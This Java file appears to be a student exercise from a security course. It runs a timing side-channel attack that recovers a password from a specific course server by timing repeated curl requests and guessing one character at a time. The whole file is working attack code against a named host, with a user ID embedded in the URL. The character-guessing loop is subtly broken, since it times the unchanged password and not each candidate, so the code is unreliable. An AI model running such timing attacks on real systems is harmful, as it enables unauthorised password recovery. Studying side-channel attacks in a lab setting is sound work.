package ex01_M2;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.sun.xml.internal.ws.util.StringUtils;

public class ex01_M2 {

	static final String URL = "http://aoi.ise.bgu.ac.il/?user=305555179&password=";
	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
	static final String DIFFICULTY = "&difficulty=";

	final static char[] LETTERS = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

	/**
	 * @param args
	 */
	public static void main(String[] args) throws Exception {
		int difficulty = 1;
		int attempts = 10;
		//		int len = findPasswordLength(3, difficulty);
		//		System.out.println("password length: "+len);

		String passwd = findPassword(attempts, difficulty); 
		System.out.println(passwd);
		//...
		//System.out.println(username + " " + password + " " + difficulty);
		//...
		//System.out.println("We have a problem");
	}

	public static int findPasswordLength(int attempts, int difficulty) {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double reqTime = 0;

		String passwd = "";
		for (int i = 0; i < maxLen; i++) {
			reqTime = 0;
			passwd += "a";
			for (int j = 0; j < attempts; j++) {
				reqTime += getReqTime(URL+passwd+DIFFICULTY+difficulty); 
			}
			reqTime = reqTime/attempts;
			if (maxReqTime < reqTime) {
				maxReqTime = reqTime;
				len = i;
			}
		}

		return len;
	}

	public static String findPassword(int attempts, int difficulty) {

		int len = findPasswordLength(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double reqTime = 0;

		StringBuilder tmpPass = new StringBuilder();

		for (int i = 0; i < len; i++) {
			tmpPass.append('0');
		}

		StringBuilder passwd = new StringBuilder(tmpPass);

		for (int i = 0; i < len -1; i++) {
			
			maxReqTime = 0;
			tmpPass = new StringBuilder(passwd);
			
			for (int j = 0; j < lettersLen; j++) {

				reqTime = 0;

				tmpPass.setCharAt(i, LETTERS[j]);

				for (int k = 0; k < attempts; k++) {
					reqTime += getReqTime(URL+passwd+DIFFICULTY+difficulty); 
				}

				reqTime = reqTime/attempts;
				if (maxReqTime < reqTime) {
					maxReqTime = reqTime;
					passwd.setCharAt(i, LETTERS[j]);
				}
				
				System.out.println("reqTime: "+reqTime+", tmPass: "+tmpPass);
			}
		}

		for (int j = 0; j < lettersLen; j++) {

			passwd.setCharAt(len-1, LETTERS[j]);

			if(sendReq(URL+passwd+DIFFICULTY+difficulty)) {
				return passwd.toString();
			}
		}

		return passwd.toString();
	}

	public static boolean sendReq(String url) {

		try {
			Process process = Runtime.getRuntime().exec(CURL_CMD_START+ url);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			return stdInput.readLine().equals("1");

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	public static double getReqTime(String url) {

		try {
			Process process = Runtime.getRuntime().exec(CURL_CMD_START+url);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			stdInput.readLine();
			return Double.parseDouble(stdInput.readLine());

		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}
}

